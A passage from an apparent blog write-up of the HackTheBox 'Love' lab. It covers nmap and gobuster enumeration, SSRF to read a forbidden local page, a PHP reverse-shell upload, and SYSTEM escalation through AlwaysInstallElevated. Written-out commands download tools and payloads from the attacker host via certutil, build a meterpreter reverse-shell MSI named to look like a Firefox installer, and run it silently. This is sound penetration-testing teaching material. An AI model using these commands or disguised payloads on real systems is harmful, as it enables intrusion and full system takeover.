&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: LOVE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2021-08-03T03:43:53-07:00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-08-03T10:43:51
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 328.65 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;-p-: Scan the entire port range.&lt;/li&gt;
&lt;li&gt;-oA: Save the nmap output on the designated file in all available formats.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
&lt;p&gt;From this machine&amp;rsquo;s nmap output, it could be easy to get lost since a lot of ports are open. That is because more ports open generally mean more opportunities for exploitation. However it could also mean more false positives that could end up wasting our time. Especially in the context of HackTheBox boxes, so many ports on an easy machine definitely mean that they are there to just confuse us. What we should be doing is take it step by step, starting by the HTTP/HTTPS servers. These are on ports 80, 443, 5000. In our case only port 80 and 443 are going to give us the info we need to continue, since the server on port 5000 forbids us from accessing it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/11.png&#34; alt=&#34;Pasted image 20210803072734.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;port-80443&#34;&gt;Port 80/443&lt;/h1&gt;
&lt;p&gt;Navigating to the http://10.10.10.239 we get the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/2.png&#34; alt=&#34;Pasted image 20210803061622.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This appears to be a voting system that requires valid credentials in order to log in. Something to note is that it uses php, something we can confirm from the &lt;strong&gt;Wappalyzer&lt;/strong&gt; Firefox plugin, the server&amp;rsquo;s title or if we visit &lt;strong&gt;http://10.10.10.239/index.php&lt;/strong&gt;. We also start our &lt;strong&gt;gobuster&lt;/strong&gt; with:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;-x&lt;/strong&gt; argument is going to help us identify files and not only folders on the server. Our file choice can vary, however we only search for &lt;strong&gt;.txt&lt;/strong&gt; and &lt;strong&gt;.php&lt;/strong&gt; files since we identified that the server uses php. Looking at it&amp;rsquo;s results, we see that a &lt;strong&gt;/admin&lt;/strong&gt; folder exists. Visiting &lt;strong&gt;http://10.10.10.239/admin/&lt;/strong&gt; we see the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/4.png&#34; alt=&#34;Pasted image 20210803064531.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;While similar to the previous login page, this appears to be the page that the admin is going to log in from, while the previous was just for the voters. At this point we have no credentials, no further findings from gobuster and no other vulnerability identified whatsoever, so we move on to port 443. Visiting &lt;strong&gt;https://10.10.10.239&lt;/strong&gt; we get the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/3.png&#34; alt=&#34;Pasted image 20210803063511.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;While we can&amp;rsquo;t view the page, since this is HTTPS, we can view the &lt;strong&gt;certificate&lt;/strong&gt; in order to identify any leaked information. Clicking at the top left of the page and selecting to view the certificate we get the following information:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/5.png&#34; alt=&#34;Pasted image 20210803065321.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is very valuable information for us since we get the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An email address as well as a username.&lt;/li&gt;
&lt;li&gt;The domain of the target.&lt;/li&gt;
&lt;li&gt;A subdomain that may provide us with a new page.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It should be noted that the nmap scan had already identified for us the domain name as well the subdomain on the port 443 results, using the same method we did (inspecting the certificate), however it is good practice to manually test things, so it was showcased here. Since we have learned that the target&amp;rsquo;s domain is &lt;strong&gt;love.htb&lt;/strong&gt; and that the subdomain &lt;strong&gt;staging.love.htb&lt;/strong&gt; also exists, we are going to enter them on our &lt;strong&gt;/etc/hosts&lt;/strong&gt; file:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/6.png&#34; alt=&#34;Pasted image 20210803070346.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Visiting &lt;strong&gt;&lt;a href=&#34;http://love.htb&#34;&gt;http://love.htb&lt;/a&gt;&lt;/strong&gt; directs us to the already seen voting system page. However, visiting &lt;strong&gt;&lt;a href=&#34;http://staging.love.htb&#34;&gt;http://staging.love.htb&lt;/a&gt;&lt;/strong&gt; page directs us to a new page:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/7.png&#34; alt=&#34;Pasted image 20210803070810.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This appears to be used as a page used to scan visitor&amp;rsquo;s files for recognized malware signatures. It seems that it is still in beta testing and we can not sign up for it, however we can try it by clicking on the &amp;ldquo;&lt;strong&gt;Demo&lt;/strong&gt;&amp;rdquo; link on the top left:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/8.png&#34; alt=&#34;Pasted image 20210803070854.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Here we have to enter the URL of a file and it will scan it for us. To test it, we will start a simple python server on our machine and try to scan a file on our machine. In this case i will scan the nmap output file:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/9.png&#34; alt=&#34;Pasted image 20210803071724.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Further testing this, we try to scan the target itself:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/10.png&#34; alt=&#34;Pasted image 20210803072049.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;At this point we know we can request resources. The next step would be to test the same thing, but by using the localhost IP address:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/12.png&#34; alt=&#34;Pasted image 20210803073126.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This also works! This points to an SSRF vulnerability. Since we were able to read the &lt;strong&gt;http://10.10.10.239/&lt;/strong&gt; page from the tool, what we could try to do is to read the page hosted on the other open port we found earlier. On port &lt;strong&gt;5000&lt;/strong&gt; we had a &amp;ldquo;&lt;strong&gt;Forbidden&lt;/strong&gt;&amp;rdquo; error. Scanning the following URL through the tool:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;http://10.10.10.239:5000&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;brought the same results (Forbidden). However since we identified an SSRF vulnerability, maybe the following scan will have different results:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;http://127.0.0.1:5000&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Indeed, scanning http://127.0.0.1:5000, no longer brings the forbidden error and instead brings the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/14.png&#34; alt=&#34;Pasted image 20210803075146.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;While this is quite an unrealistic way to obtain credentials, it is a very good example to show how &lt;strong&gt;SSRF&lt;/strong&gt; let us read something we were forbidden to.&lt;/p&gt;
&lt;p&gt;Since we now have admin credentials, as well as the admin page we previously found on &lt;strong&gt;http://10.10.10.239/admin/&lt;/strong&gt; we can now log in:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/15.png&#34; alt=&#34;Pasted image 20210803080650.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;getting-a-shell-as-phoebe&#34;&gt;Getting a shell as phoebe&lt;/h1&gt;
&lt;p&gt;In General when we log in to platforms like this, what we want to look for, is any way that we can upload files and maybe execute them. What we know about this particular server is that it uses php, so if we manage to upload and execute php we have our shell. Clicking around the plattform&amp;rsquo;s categories seems to bring no interesting results. When we try all the links, what is left is the &amp;ldquo;&lt;strong&gt;Update Profile&lt;/strong&gt;&amp;rdquo; feature:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/16.png&#34; alt=&#34;Pasted image 20210805144755.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Clicking on it, we get the following page, where we can change various information of the user:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/17.png&#34; alt=&#34;Pasted image 20210805144840.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Having in mind what we said earlier about being able to upload files, the interesting choice here is obvious. First things first we try uploading an actual image to see if and how this works. Our test image will be a .png file randomly found on the internet:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/18.png&#34; alt=&#34;Pasted image 20210805145351.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Uploading and saving our change seems to be sucessful!:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/19.png&#34; alt=&#34;Pasted image 20210805145520.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since we can upload files, we now have two missions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Find where the server saves this image.&lt;/li&gt;
&lt;li&gt;Try to upload a .php file instead of an image file and execute it from the path we identified from the previous step.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first mission is quite easy, since we can just right click on the profile image and select &amp;ldquo;&lt;strong&gt;View Image&lt;/strong&gt;&amp;rdquo;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/20.png&#34; alt=&#34;Pasted image 20210805145835.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It is clear here based on the URL, that the server saves any uploaded image to the &lt;strong&gt;/image&lt;/strong&gt; path.&lt;/p&gt;
&lt;p&gt;To succeed in the second mission we will try to upload a .php reverse shell. What we may encounter in general, are upload filters, however, as we will see, there are no filters in this particular box. The shell we are going to upload is found here (of course you can experiment with any shell found online, since there are many of them):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php&#34;&gt;https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After editing the php file to fill our own IP and port we want to listen to, uploading it and saving our changes, we get a success:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/21.png&#34; alt=&#34;Pasted image 20210805150453.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The last step would be to see if our shell is functional by visiting the &lt;strong&gt;/images/reverse_shell.php&lt;/strong&gt; path. Before that we should of course start our listener:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rlwrap nc -nvlp &lt;span class=&#34;m&#34;&gt;9001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;As you noticed we used &lt;strong&gt;rlwrap&lt;/strong&gt;. The reason is this is a windows machine and it will be hard creating an interactive shell the way we would on a linux target. rlwrap (&lt;a href=&#34;https://github.com/hanslub42/rlwrap&#34;&gt;https://github.com/hanslub42/rlwrap&lt;/a&gt;) helps us making the shell somewhat interactive.
Visiting &lt;strong&gt;10.10.10.239/images/reverse.php&lt;/strong&gt; we get a shell:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/22.png&#34; alt=&#34;Pasted image 20210805154319.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Since we are now in the box, firing up &lt;strong&gt;winpeas&lt;/strong&gt; (&lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&lt;/a&gt;) is a perfect start to identify any vulnerability, so we transfer it to the target by using &lt;strong&gt;certutil.exe&lt;/strong&gt; after hosting it on a &lt;strong&gt;Python 3&lt;/strong&gt; simple server on our box:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;mkdir temp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; temp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;certutil -urlcache -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.3/winpeas.exe&amp;#34;&lt;/span&gt; winpeas.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;inpeas.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;One of the advantages of winpeas, is that it will color code it&amp;rsquo;s findings based on severity. After scrolling a bit we see the following, color coded with red (an interesting find):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/23.png&#34; alt=&#34;Pasted image 20210805161045.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It appears that the two above registry values of &lt;strong&gt;AlwaysInstallElevated&lt;/strong&gt; are set to 1. With a simple search about this we learn that we can use the AlwaysInstallElevated policy to install a &lt;strong&gt;Windows Installer Package&lt;/strong&gt; (&lt;strong&gt;.msi&lt;/strong&gt; files) with elevated (system) privileges. According to &lt;strong&gt;Microsoft&lt;/strong&gt;, this option is equivalent to granting full administrative rights, which can pose a massive security risk. By setting the following registry values:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer&lt;/li&gt;
&lt;li&gt;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;to 1 (which we already have here) we are able to install &lt;strong&gt;.msi&lt;/strong&gt; files with System privileges.&lt;/p&gt;
&lt;p&gt;At this point it is pretty clear what we have to do. We will create a malicious &lt;strong&gt;.msi&lt;/strong&gt; file, transfer it to the victim and execute it, in order to get an elevated shell. The tool we are going to use is of course msfvenom, and our payload of choice will be a &lt;strong&gt;meterpreter reverse tcp&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.14.3 &lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9002&lt;/span&gt; -f msi &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Firefox_Setup.msi&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;On the output we can just select a random name that will not raise suspicions. A Firefox setup package name will do the job just fine. Next step is hosting the malicious file and transfering it to the target:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;certutil -urlcache -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.3/Firefox_Setup.msi&amp;#34;&lt;/span&gt; Firefox_Setup.msi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Before exeuting the file we of course need to start listening on port 9002 that we specified. We will open a handler on Metasploit, select the correct payload, and start listening:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 10.10.14.3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;9002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Last step is executing the malicious file. To install it, we are going to use &lt;strong&gt;msiexec&lt;/strong&gt; since we want full control over the installation process:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msiexec /quiet /qn /i Firefox_Setup.msi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The options used here are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;/quiet&lt;/strong&gt;: This will suppress any messages during installation leading to a more clean output and requiring no user interaction.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/qn&lt;/strong&gt;: Specifies there&amp;rsquo;s no UI during the installation process.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;/i&lt;/strong&gt;: Specifies normal installation instead of an administrative one.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After running the executable, we immediately get a meterpreter shell back as SYSTEM:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/24.png&#34; alt=&#34;Pasted image 20210805163948.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.sqreen.com/ssrf-explained/&#34;&gt;https://blog.sqreen.com/ssrf-explained/&lt;/a&gt;: SSRF Explained&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf&#34;&gt;https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf&lt;/a&gt;: More SSRF stuff including a cheatsheet.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/&#34;&gt;https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/&lt;/a&gt;: AlwaysInstallElevated Tested&lt;/li&gt;
&lt;/ul&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
